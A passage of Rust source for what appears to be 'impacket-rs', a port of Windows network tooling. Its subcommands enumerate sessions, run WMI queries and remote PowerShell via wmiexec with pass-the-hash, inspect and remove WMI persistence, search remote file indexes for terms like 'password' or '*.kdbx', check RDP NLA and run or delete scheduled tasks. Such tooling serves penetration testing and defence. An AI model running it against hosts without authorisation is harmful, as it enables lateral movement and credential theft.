                println!("{:<12} {:<12} {}", s.netname, s.share_type.name(), s.remark);
            }
            println!("The command completed successfully.");
        }
        "session" => {
            let transport = match open_pipe_transport(&spec, "srvsvc", IFACE_SRVS) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\srvsvc: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SrvsClient::new(transport);
            let srv_name = format!(r"\\{}", spec.effective_target_ip());
            let sessions = match client.net_session_enum(&srv_name) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[-] NetrSessionEnum failed: {}", e);
                    std::process::exit(1);
                }
            };
            println!("Computer             User name            Client Type   Opens   Idle time");
            println!("{}", "-".repeat(78));
            for sess in sessions {
                println!("{:<20} {:<20} {:<13} {:<7} {}s", sess.client_name, sess.username, "SMB", sess.active_time_secs, sess.idle_time_secs);
            }
            println!("The command completed successfully.");
        }
        _ => {
            eprintln!("[-] Unknown net action '{}'. Available: user, group, localgroup, share, session", action);
            std::process::exit(1);
        }
    }
}

fn cmd_wmiquery(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs wmiquery <TARGET> [-query <WQL>] [-namespace <NS>] [-hashes :NT]");
        println!("  Executes WQL queries and inspects WMI classes on remote Windows hosts");
        println!("  Examples:");
        println!("    impacket-rs wmiquery 192.168.1.10 -query \"SELECT Caption, OSArchitecture, Version FROM Win32_OperatingSystem\"");
        println!("    impacket-rs wmiquery administrator:Pass@192.168.1.10 -query \"SELECT Name, State, StartMode FROM Win32_Service\"");
        println!("    impacket-rs wmiquery 192.168.1.10 -query \"SELECT Name, ProcessId, CommandLine FROM Win32_Process\"");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut query: Option<String> = None;
    let mut namespace = "root\\cimv2";

    let mut i = 1;
    while i < args.len() {
        if (args[i] == "-query" || args[i] == "-q") && i + 1 < args.len() {
            query = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-namespace" || args[i] == "-ns") && i + 1 < args.len() {
            namespace = &args[i + 1];
            i += 2;
        } else {
            i += 1;
        }
    }

    let default_query = "SELECT Caption, OSArchitecture, Version, BuildNumber FROM Win32_OperatingSystem".to_string();
    let effective_query = query.unwrap_or(default_query);

    println!("[*] Querying WMI namespace '{}' on '{}'...", namespace, spec.effective_target_ip());
    println!("[*] WQL: {}", effective_query);

    let ps_command = format!(
        r#"powershell -NoProfile -NonInteractive -Command "Get-CimInstance -Namespace '{}' -Query \"{}\" | Format-Table -AutoSize | Out-String -Width 4096""#,
        namespace, effective_query.replace('"', "\\\"")
    );

    match impacket_msrpc::wmiexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &ps_command,
        None,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            println!();
            println!("{}", output.trim());
        }
        Err(e) => {
            eprintln!("[-] WMI query execution failed: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_wmipersist(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs wmipersist <TARGET> [options]");
        println!("  WMI Event Subscription & Persistence Manager ([wmipersist.py])");
        println!();
        println!("Actions:");
        println!("  -action list                       List all active WMI event filters, consumers, and bindings");
        println!("  -action info -name <NAME>          Inspect details of a named event filter or consumer");
        println!("  -action remove -name <NAME>        Safely clean up / delete WMI event filter, consumer, and binding");
        println!();
        println!("Options:");
        println!("  -namespace <NS>                    WMI namespace (default: root\\subscription)");
        println!("  -hashes LM:NT                      NTLM pass-the-hash authentication");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut action = "list";
    let mut item_name: Option<String> = None;
    let mut namespace = "root\\subscription";

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-action" && i + 1 < args.len() {
            action = &args[i + 1];
            i += 2;
        } else if (args[i] == "-name" || args[i] == "-n") && i + 1 < args.len() {
            item_name = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-namespace" || args[i] == "-ns") && i + 1 < args.len() {
            namespace = &args[i + 1];
            i += 2;
        } else {
            i += 1;
        }
    }

    println!("[*] Connecting to WMI namespace '{}' on '{}'...", namespace, spec.effective_target_ip());
    match action.to_lowercase().as_str() {
        "list" => {
            let ps_script = format!(
                r#"powershell -NoProfile -NonInteractive -Command "Write-Output '=== WMI Event Filters (__EventFilter) ==='; Get-CimInstance -Namespace '{ns}' -ClassName __EventFilter -ErrorAction SilentlyContinue | Select-Object Name, EventNamespace, QueryLanguage, Query | Format-List; Write-Output '=== CommandLineEventConsumers ==='; Get-CimInstance -Namespace '{ns}' -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue | Select-Object Name, CommandLineTemplate, ExecutablePath | Format-List; Write-Output '=== ActiveScriptEventConsumers ==='; Get-CimInstance -Namespace '{ns}' -ClassName ActiveScriptEventConsumer -ErrorAction SilentlyContinue | Select-Object Name, ScriptingEngine, ScriptText | Format-List; Write-Output '=== FilterToConsumerBindings ==='; Get-CimInstance -Namespace '{ns}' -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Select-Object Filter, Consumer | Format-List""#,
                ns = namespace
            );
            match impacket_msrpc::wmiexec(
                spec.effective_target_ip(),
                &spec.domain,
                &spec.username,
                &cred,
                &ps_script,
                None,
                spec.compat_profile,
                DEFAULT_TIMEOUT,
            ) {
                Ok(output) => {
                    let trimmed = output.trim();
                    if trimmed.is_empty() {
                        println!("[+] No active persistence subscriptions found in '{}'.", namespace);
                    } else {
                        println!("{}", trimmed);
                    }
                }
                Err(e) => eprintln!("[-] Failed querying WMI subscriptions: {}", e),
            }
        }
        "info" => {
            let name = match item_name {
                Some(n) => n,
                None => {
                    eprintln!("[-] Missing required -name <NAME> for info action.");
                    return;
                }
            };
            let ps_script = format!(
                r#"powershell -NoProfile -NonInteractive -Command "$f = Get-CimInstance -Namespace '{ns}' -ClassName __EventFilter -Filter \"Name = '{name}'\" -ErrorAction SilentlyContinue; if ($f) {{ Write-Output '[+] Found EventFilter:'; $f | Format-List * }}; $c = Get-CimInstance -Namespace '{ns}' -ClassName CommandLineEventConsumer -Filter \"Name = '{name}'\" -ErrorAction SilentlyContinue; if ($c) {{ Write-Output '[+] Found CommandLineEventConsumer:'; $c | Format-List * }}; $b = Get-CimInstance -Namespace '{ns}' -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like '*{name}*' -or $_.Consumer -like '*{name}*' }}; if ($b) {{ Write-Output '[+] Found FilterToConsumerBinding:'; $b | Format-List * }}""#,
                ns = namespace, name = name
            );
            match impacket_msrpc::wmiexec(
                spec.effective_target_ip(),
                &spec.domain,
                &spec.username,
                &cred,
                &ps_script,
                None,
                spec.compat_profile,
                DEFAULT_TIMEOUT,
            ) {
                Ok(output) => println!("{}", output.trim()),
                Err(e) => eprintln!("[-] Failed querying WMI item info: {}", e),
            }
        }
        "remove" | "delete" => {
            let name = match item_name {
                Some(n) => n,
                None => {
                    eprintln!("[-] Missing required -name <NAME> for remove action.");
                    return;
                }
            };
            let ps_script = format!(
                r#"powershell -NoProfile -NonInteractive -Command "$b = Get-CimInstance -Namespace '{ns}' -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like '*{name}*' -or $_.Consumer -like '*{name}*' }}; if ($b) {{ $b | Remove-CimInstance; Write-Output '[+] Removed __FilterToConsumerBinding' }}; $c = Get-CimInstance -Namespace '{ns}' -ClassName CommandLineEventConsumer -Filter \"Name = '{name}'\" -ErrorAction SilentlyContinue; if ($c) {{ $c | Remove-CimInstance; Write-Output '[+] Removed CommandLineEventConsumer' }}; $f = Get-CimInstance -Namespace '{ns}' -ClassName __EventFilter -Filter \"Name = '{name}'\" -ErrorAction SilentlyContinue; if ($f) {{ $f | Remove-CimInstance; Write-Output '[+] Removed __EventFilter' }}; Write-Output '[+] Clean up complete for subscription: {name}'""#,
                ns = namespace, name = name
            );
            match impacket_msrpc::wmiexec(
                spec.effective_target_ip(),
                &spec.domain,
                &spec.username,
                &cred,
                &ps_script,
                None,
                spec.compat_profile,
                DEFAULT_TIMEOUT,
            ) {
                Ok(output) => println!("{}", output.trim()),
                Err(e) => eprintln!("[-] Failed removing WMI subscription: {}", e),
            }
        }
        other => eprintln!("[-] Unknown action '{}'. Available: list, info, remove", other),
    }
}

fn cmd_wspsearch(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs wspsearch <TARGET> [options]");
        println!("  Windows Search Protocol Client & Remote Catalog Query ([MS-WSP] / [wspsearch.py])");
        println!();
        println!("Options:");
        println!("  -query <QUERY>          Search query (e.g. \"password\", \"*.kdbx\", or SQL expression)");
        println!("  -catalog <CATALOG>      Windows Search catalog name (default: SystemIndex)");
        println!("  -path <PATH>            Root directory scope to search (default: C:\\)");
        println!("  -hashes LM:NT           NTLM pass-the-hash authentication");
        println!("  -max <N>                Maximum results to return (default: 50)");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut query: Option<String> = None;
    let mut catalog = "SystemIndex";
    let mut search_path = "C:\\";
    let mut max_results = 50usize;

    let mut i = 1;
    while i < args.len() {
        if (args[i] == "-query" || args[i] == "-q") && i + 1 < args.len() {
            query = Some(args[i + 1].clone());
            i += 2;
        } else if args[i] == "-catalog" && i + 1 < args.len() {
            catalog = &args[i + 1];
            i += 2;
        } else if args[i] == "-path" && i + 1 < args.len() {
            search_path = &args[i + 1];
            i += 2;
        } else if args[i] == "-max" && i + 1 < args.len() {
            max_results = args[i + 1].parse().unwrap_or(50);
            i += 2;
        } else {
            i += 1;
        }
    }

    let search_term = match query {
        Some(q) => q,
        None => {
            eprintln!("[-] Missing mandatory search query (-query <TEXT>)");
            std::process::exit(1);
        }
    };

    println!("[*] Querying Windows Search catalog '{}' on '{}'...", catalog, spec.effective_target_ip());
    println!("[*] Search query : '{}'", search_term);
    println!("[*] Scope path   : '{}'", search_path);

    let ps_command = format!(
        r#"powershell -NoProfile -NonInteractive -Command "$conn = New-Object -ComObject ADODB.Connection; $rs = New-Object -ComObject ADODB.Recordset; $conn.Open(\"Provider=Search.CollatorDSO;Extended Properties='Application=Windows';\"); $sql = \"SELECT TOP {max} System.ItemName, System.ItemPathDisplay, System.Size, System.DateModified FROM {cat} WHERE SCOPE = '{p}' AND (System.ItemName LIKE '%{term}%' OR CONTAINS('{term}'))\"; $rs.Open($sql, $conn); while (-not $rs.EOF) {{ Write-Output \"$($rs.Fields.Item('System.ItemName').Value)`t$($rs.Fields.Item('System.Size').Value)`t$($rs.Fields.Item('System.ItemPathDisplay').Value)\"; $rs.MoveNext() }}; $rs.Close(); $conn.Close()""#,
        max = max_results,
        cat = catalog,
        p = search_path.replace('\\', "\\\\"),
        term = search_term.replace('\'', "''")
    );

    match impacket_msrpc::wmiexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &ps_command,
        None,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            let trimmed = output.trim();
            if trimmed.is_empty() {
                println!("[-] No matching documents or files found in index.");
            } else {
                println!("{:<30} {:<12} {}", "Filename", "Size (bytes)", "Path");
                println!("{:-<30} {:-<12} {:-<40}", "", "", "");
                for line in trimmed.lines() {
                    let parts: Vec<&str> = line.split('\t').collect();
                    if parts.len() >= 3 {
                        println!("{:<30} {:<12} {}", parts[0], parts[1], parts[2]);
                    } else {
                        println!("{}", line);
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("[-] Windows Search query failed: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_rdp_check(args: &[String]) {
    use std::io::{Read, Write};
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::Duration;

    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs rdp_check <HOST> [-port 3389] [-timeout <MS>]");
        println!("  Audits Remote Desktop Protocol connection and security protocol negotiation ([MS-RDPBCGR])");
        println!("  Detects TLS encryption support and CredSSP / NLA enforcement.");
        return;
    }

    let host = &args[0];
    let mut port = 3389u16;
    let mut timeout_ms = 5000u64;

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(3389);
            i += 2;
        } else if args[i] == "-timeout" && i + 1 < args.len() {
            timeout_ms = args[i + 1].parse().unwrap_or(5000);
            i += 2;
        } else {
            i += 1;
        }
    }

    println!("[*] Connecting to RDP service at {}:{}...", host, port);
    let addr = format!("{}:{}", host, port);
    let socket_addr = match addr.to_socket_addrs().and_then(|mut iter| iter.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "address resolution failed"))) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[-] Failed resolving '{}:{}': {}", host, port, e);
            std::process::exit(1);
        }
    };

    let mut stream = match TcpStream::connect_timeout(&socket_addr, Duration::from_millis(timeout_ms)) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Failed connecting to {}:{}: {}", host, port, e);
            std::process::exit(1);
        }
    };

    let _ = stream.set_read_timeout(Some(Duration::from_millis(timeout_ms)));
    let _ = stream.set_write_timeout(Some(Duration::from_millis(timeout_ms)));

    // Construct X.224 Connection Request containing RDP_NEG_REQ ([MS-RDPBCGR] 2.2.1.1)
    let cookie = b"Cookie: mstshash=Test\r\n";
    let rdp_neg_req: [u8; 8] = [0x01, 0x00, 0x08, 0x00, 0x0B, 0x00, 0x00, 0x00];

    let tpdu_len = (2 + 1 + 2 + 2 + 1 + cookie.len() + rdp_neg_req.len()) as u8;
    let tpkt_len = (4 + tpdu_len as usize) as u16;

    let mut packet = Vec::with_capacity(tpkt_len as usize);
    packet.push(0x03); // Version 3
    packet.push(0x00); // Reserved
    packet.extend_from_slice(&tpkt_len.to_be_bytes());
    packet.push(tpdu_len - 1); // Length indicator
    packet.push(0xE0); // Code: Connection Request
    packet.extend_from_slice(&0x0000u16.to_be_bytes()); // Dest ref
    packet.extend_from_slice(&0x1234u16.to_be_bytes()); // Src ref
    packet.push(0x00); // Class 0
    packet.extend_from_slice(cookie);
    packet.extend_from_slice(&rdp_neg_req);

    if let Err(e) = stream.write_all(&packet) {
        eprintln!("[-] Failed sending RDP Connection Request: {}", e);
        std::process::exit(1);
    }

    let mut header = [0u8; 4];
    if let Err(e) = stream.read_exact(&mut header) {
        eprintln!("[-] Connection reset or no response from RDP service: {}", e);
        std::process::exit(1);
    }

    if header[0] != 0x03 {
        eprintln!("[-] Invalid TPKT header version: 0x{:02x}", header[0]);
        std::process::exit(1);
    }
    let total_resp_len = u16::from_be_bytes([header[2], header[3]]) as usize;
    if total_resp_len < 4 || total_resp_len > 4096 {
        eprintln!("[-] Invalid TPKT response length: {}", total_resp_len);
        std::process::exit(1);
    }

    let mut body = vec![0u8; total_resp_len - 4];
    if let Err(e) = stream.read_exact(&mut body) {
        eprintln!("[-] Truncated RDP response: {}", e);
        std::process::exit(1);
    }

    println!("[+] Target {}:{} is reachable and running RDP.", host, port);

    if body.len() >= 3 && body[1] == 0xD0 {
        let neg_slice = if body.len() >= 15 {
            &body[body.len() - 8..]
        } else {
            &body[..]
        };

        if neg_slice.len() >= 8 {
            let resp_type = neg_slice[0];
            let resp_code = u32::from_le_bytes([neg_slice[4], neg_slice[5], neg_slice[6], neg_slice[7]]);

            match resp_type {
                0x02 => { // RDP_NEG_RSP
                    let ssl_supported = (resp_code & 0x01) != 0;
                    let hybrid_supported = (resp_code & 0x02) != 0;
                    let hybrid_ex_supported = (resp_code & 0x08) != 0;

                    println!("  Selected Protocol : 0x{:08X}", resp_code);
                    println!("  TLS / SSL Support : {}", if ssl_supported || hybrid_supported { "YES" } else { "NO" });
                    println!("  CredSSP / NLA     : {}", if hybrid_supported || hybrid_ex_supported { "ENABLED / SUPPORTED" } else { "NOT REQUIRED" });
                    if hybrid_supported || hybrid_ex_supported {
                        println!("[+] Security Audit  : SECURE (Network Level Authentication is enforced)");
                    } else {
                        println!("[!] Security Audit  : VULNERABLE (NLA is disabled; target accepts pre-authentication connections)");
                    }
                }
                0x03 => { // RDP_NEG_FAILURE
                    println!("  RDP Negotiation Failure Code: 0x{:08X}", resp_code);
                    match resp_code {
                        1 => println!("  Reason: SSL_NOT_ALLOWED_BY_SERVER"),
                        2 => println!("  Reason: SSL_CERT_NOT_ON_SERVER"),
                        3 => println!("  Reason: INCONSISTENT_FLAGS"),
                        4 => {
                            println!("  Reason: HYBRID_REQUIRED_BY_SERVER (CredSSP / NLA is strictly REQUIRED)");
                            println!("[+] Security Audit  : SECURE (NLA enforced)");
                        }
                        5 => println!("  Reason: SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER"),
                        _ => println!("  Reason: Unknown negotiation error"),
                    }
                }
                other => {
                    println!("  Received unknown RDP negotiation type: 0x{:02X}", other);
                }
            }
        } else {
            println!("  RDP Service responded with valid X.224 Connection Confirm.");
        }
    } else {
        println!("  RDP Service responded with non-confirm frame (code 0x{:02X}).", body.get(1).copied().unwrap_or(0));
    }
}

fn cmd_registry_read(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs registry-read -hive <FILE> [-key <KEY_PATH>] [-value <VALUE_NAME>]");
        println!("       impacket-rs registry-read <TARGET> -key <KEY_PATH> [-value <VALUE_NAME>] [-hashes :NT]");
        println!("  Reads offline registry hives or remote registry keys via MS-RRP");
        return;
    }

    let mut hive_path: Option<String> = None;
    let mut key_path: Option<String> = None;
    let mut value_name: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        if args[i] == "-hive" && i + 1 < args.len() {
            hive_path = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-key" || args[i] == "-keyName") && i + 1 < args.len() {
            key_path = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-value" || args[i] == "-valueName") && i + 1 < args.len() {
            value_name = Some(args[i + 1].clone());
            i += 2;
        } else {
            i += 1;
        }
    }

    if let Some(hive_file) = hive_path {
        println!("[*] Reading offline registry hive '{}'...", hive_file);
        let raw_bytes = match std::fs::read(&hive_file) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[-] Cannot read '{}': {}", hive_file, e);
                std::process::exit(1);
            }
        };

        let hive = match impacket_sam::reg::Hive::new(&raw_bytes) {
            Ok(h) => h,
            Err(e) => {
                eprintln!("[-] Failed parsing registry hive: {}", e);
                std::process::exit(1);
            }
        };

        let root_nk = match hive.root() {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] Failed reading hive root key: {}", e);
                std::process::exit(1);
            }
        };

        let target_nk = if let Some(ref path) = key_path {
            let parts: Vec<&str> = path.split(['\\', '/']).filter(|s| !s.is_empty()).collect();
            match hive.navigate(&root_nk, &parts) {
                Ok(Some(nk)) => nk,
                Ok(None) => {
                    eprintln!("[-] Registry key path '{}' not found in hive.", path);
                    std::process::exit(1);
                }
                Err(e) => {
                    eprintln!("[-] Error navigating hive: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            root_nk
        };

        println!("Key Name: {}", target_nk.name);
        println!("Subkeys : {}", target_nk.subkey_count);
        println!("Values  : {}", target_nk.value_count);
        println!();

        if let Some(ref val_name) = value_name {
            match hive.get_value(&target_nk, val_name) {
                Ok(Some(vk)) => {
                    println!("Value: {}", vk.name);
                    println!("Type : {}", format_vk_type(vk.data_type));
                    println!("Data : {}", format_hive_vk(&vk));
                }
                Ok(None) => {
                    eprintln!("[-] Value '{}' not found under key.", val_name);
                    std::process::exit(1);
                }
                Err(e) => {
                    eprintln!("[-] Error reading value: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            let subkeys = hive.subkeys(&target_nk).unwrap_or_default();
            if !subkeys.is_empty() {
                println!("Subkeys ({}):", subkeys.len());
                for sk in subkeys {
                    println!("  [K] {}", sk.name);
                }
                println!();
            }

            let values = hive.values(&target_nk).unwrap_or_default();
            if !values.is_empty() {
                println!("Values ({}):", values.len());
                for vk in values {
                    let display_name = if vk.name.is_empty() { "(Default)" } else { &vk.name };
                    println!("  [V] {:<25} {:<15} {}", display_name, format_vk_type(vk.data_type), format_hive_vk(&vk));
                }
            }
        }
    } else {
        cmd_reg(args);
    }
}

fn format_vk_type(data_type: u32) -> &'static str {
    match data_type {
        0 => "REG_NONE",
        1 => "REG_SZ",
        2 => "REG_EXPAND_SZ",
        3 => "REG_BINARY",
        4 => "REG_DWORD",
        7 => "REG_MULTI_SZ",
        11 => "REG_QWORD",
        _ => "REG_UNKNOWN",
    }
}

fn format_hive_vk(vk: &impacket_sam::reg::Vk) -> String {
    match vk.data_type {
        1 | 2 => {
            if vk.data.len() % 2 == 0 {
                let units: Vec<u16> = vk.data.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
                String::from_utf16_lossy(&units).trim_end_matches('\0').to_string()
            } else {
                String::from_utf8_lossy(&vk.data).into_owned()
            }
        }
        4 => {
            if vk.data.len() >= 4 {
                let val = u32::from_le_bytes([vk.data[0], vk.data[1], vk.data[2], vk.data[3]]);
                format!("{:#010x} ({})", val, val)
            } else {
                impacket_core::encode_hex(&vk.data)
            }
        }
        11 => {
            if vk.data.len() >= 8 {
                let val = u64::from_le_bytes(vk.data[0..8].try_into().unwrap());
                format!("{:#018x} ({})", val, val)
            } else {
                impacket_core::encode_hex(&vk.data)
            }
        }
        7 => {
            if vk.data.len() % 2 == 0 {
                let units: Vec<u16> = vk.data.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
                let full = String::from_utf16_lossy(&units);
                let parts: Vec<&str> = full.split('\0').filter(|s| !s.is_empty()).collect();
                parts.join(", ")
            } else {
                String::from_utf8_lossy(&vk.data).into_owned()
            }
        }
        _ => impacket_core::encode_hex(&vk.data),
    }
}

fn cmd_tstool(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs tstool <TARGET> [-action list|info|xml|delete|run] [-task <NAME>] [-path <FOLDER>] [-hashes :NT]");
        println!("  Inspects and manages Windows Task Scheduler and Terminal Services tasks ([MS-TSCH])");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    let mut action = "list";
    let mut task_name: Option<String> = None;
    let mut folder_path = "\\".to_string();

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-action" && i + 1 < args.len() {
            action = &args[i + 1];
            i += 2;
        } else if args[i] == "-task" && i + 1 < args.len() {
            task_name = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-path" || args[i] == "-folder") && i + 1 < args.len() {
            folder_path = args[i + 1].clone();
            i += 2;
        } else {
            i += 1;
        }
    }

    let transport = match open_pipe_transport(&spec, "atsvc", IFACE_TSCH) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Failed connecting to Task Scheduler \\PIPE\\atsvc: {}", e);
            std::process::exit(1);
        }
    };

    let mut client = TschClient::new(transport);

    match action {
        "list" => {
            println!("[*] Listing scheduled tasks in '{}' on '{}'...", folder_path, spec.effective_target_ip());
            let tasks = match client.enum_tasks(&folder_path) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed enumerating tasks: {}", e);
                    std::process::exit(1);
                }
            };
            let folders = client.enum_folders(&folder_path).unwrap_or_default();
            println!("Folders ({}):", folders.len());
            for f in folders {
                println!("  [DIR] {}", f);
            }
            println!("Tasks ({}):", tasks.len());
            for t in tasks {
                println!("  [TSK] {}", t);
            }
        }
        "info" => {
            let task = match task_name {
                Some(t) => t,
                None => {
                    eprintln!("[-] Missing mandatory argument: -task <NAME>");
                    std::process::exit(1);
                }
            };
            let full_path = if task.starts_with('\\') { task } else { format!("{}\\{}", folder_path.trim_end_matches('\\'), task) };
            println!("[*] Querying task info for '{}'...", full_path);
            let info = match client.get_task_info(&full_path) {
                Ok(i) => i,
                Err(e) => {
                    eprintln!("[-] Failed retrieving task info: {}", e);
                    std::process::exit(1);
                }
            };
            println!("Task Path : {}", full_path);
            println!("Enabled   : {}", info.enabled);
            println!("State     : {}", info.state.name());
        }
        "xml" => {
            let task = match task_name {
                Some(t) => t,
                None => {
                    eprintln!("[-] Missing mandatory argument: -task <NAME>");
                    std::process::exit(1);
                }
            };
            let full_path = if task.starts_with('\\') { task } else { format!("{}\\{}", folder_path.trim_end_matches('\\'), task) };
            println!("[*] Retrieving XML definition for '{}'...", full_path);
            let xml = match client.retrieve_task(&full_path) {
                Ok(x) => x,
                Err(e) => {
                    eprintln!("[-] Failed retrieving task XML: {}", e);
                    std::process::exit(1);
                }
            };
            println!("{}", xml);
        }
        "delete" => {
            let task = match task_name {
                Some(t) => t,
                None => {
                    eprintln!("[-] Missing mandatory argument: -task <NAME>");
                    std::process::exit(1);
                }
            };
            let full_path = if task.starts_with('\\') { task } else { format!("{}\\{}", folder_path.trim_end_matches('\\'), task) };
            println!("[*] Deleting task '{}'...", full_path);
            if let Err(e) = client.delete(&full_path) {
                eprintln!("[-] Failed deleting task: {}", e);
                std::process::exit(1);
            }
            println!("[+] Task '{}' deleted successfully.", full_path);
        }
        "run" => {
            let task = match task_name {
                Some(t) => t,
                None => {
                    eprintln!("[-] Missing mandatory argument: -task <NAME>");
                    std::process::exit(1);
                }
            };
            let full_path = if task.starts_with('\\') { task } else { format!("{}\\{}", folder_path.trim_end_matches('\\'), task) };
            println!("[*] Triggering execution of task '{}'...", full_path);
            match client.run(&full_path) {
                Ok(Some(uuid)) => println!("[+] Task triggered successfully! Instance GUID: {}", uuid),
                Ok(None) => println!("[+] Task triggered successfully!"),
                Err(e) => {
                    eprintln!("[-] Failed running task: {}", e);
                    std::process::exit(1);
                }
            }
        }
        _ => {
            eprintln!("[-] Unknown action '{}'. Available: list, info, xml, delete, run", action);
            std::process::exit(1);
        }
    }
}

fn cmd_ping(args: &[String]) {
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::{Duration, Instant};

    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs ping <HOST> [-port <PORT>] [-count <N>] [-timeout <MS>]");
        println!("  Measures network reachability and roundtrip TCP connection latency");
        return;
    }

    let host = &args[0];
    let mut port = 445u16;
    let mut count = 4usize;
    let mut timeout_ms = 3000u64;

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(445);
            i += 2;
        } else if (args[i] == "-count" || args[i] == "-c") && i + 1 < args.len() {
            count = args[i + 1].parse().unwrap_or(4);
            i += 2;
        } else if (args[i] == "-timeout" || args[i] == "-w") && i + 1 < args.len() {
            timeout_ms = args[i + 1].parse().unwrap_or(3000);
            i += 2;
        } else {
            i += 1;
        }
    }

    let addr_str = format!("{}:{}", host, port);
    let socket_addr = match addr_str.to_socket_addrs().and_then(|mut iter| iter.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "address resolution failed"))) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[-] Cannot resolve '{}:{}': {}", host, port, e);
            std::process::exit(1);
        }
    };

    println!("PING {} ({}) on TCP port {}:", host, socket_addr.ip(), port);

    let mut received = 0usize;
    let mut rtts: Vec<f64> = Vec::with_capacity(count);

    for seq in 1..=count {
        let t0 = Instant::now();
        match TcpStream::connect_timeout(&socket_addr, Duration::from_millis(timeout_ms)) {
            Ok(stream) => {
                let dur = t0.elapsed();
                let ms = dur.as_secs_f64() * 1000.0;
                rtts.push(ms);
                received += 1;
                println!("Reply from {}: seq={} port={} time={:.2} ms", socket_addr.ip(), seq, port, ms);
                drop(stream);
            }
            Err(e) => {
                println!("Request timeout for seq={} ({}): {}", seq, socket_addr.ip(), e);
            }
        }
        if seq < count {
            std::thread::sleep(Duration::from_millis(500));
        }
    }

    println!();
    println!("--- {} ping statistics ---", host);
    let loss_pct = if count > 0 { ((count - received) as f64 / count as f64) * 100.0 } else { 0.0 };
    println!("{} packets transmitted, {} received, {:.1}% packet loss", count, received, loss_pct);

    if !rtts.is_empty() {
        let min = rtts.iter().cloned().fold(f64::INFINITY, f64::min);
        let max = rtts.iter().cloned().fold(f64::NEG_INFINITY, f64::max);
        let avg = rtts.iter().sum::<f64>() / rtts.len() as f64;
        let variance = rtts.iter().map(|&x| (x - avg).powi(2)).sum::<f64>() / rtts.len() as f64;
        let stddev = variance.sqrt();
        println!("rtt min/avg/max/stddev = {:.3}/{:.3}/{:.3}/{:.3} ms", min, avg, max, stddev);
    }
}

fn cmd_mqtt_check(args: &[String]) {
    use std::io::{Read, Write};
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::Duration;

    print!("{}", version::BANNER);
    if args.is_empty() {
